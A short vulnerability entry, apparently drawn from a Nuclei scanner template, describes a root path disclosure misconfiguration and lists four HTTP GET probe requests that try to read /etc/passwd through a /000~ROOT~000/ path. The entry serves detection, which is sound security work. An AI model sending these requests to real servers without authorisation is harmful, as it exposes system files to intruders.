# Vulnerability: ROOT - Path Disclosure
**Classification:** MISCONFIG
**Source:** Nuclei Template (`root-path-disclosure.yaml`)

## Description
Detects potential exposure of sensitive file paths like /000~ROOT~000/.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/home/000~ROOT~000/etc/passwd
GET {{BaseURL}}/000~ROOT~000/etc/passwd
GET {{BaseURL}}/OLDS/home/000~ROOT~000/etc/passwd
GET {{BaseURL}}/app/webroot/files/kcfinder/files/home/000~ROOT~000/etc/passwd
```

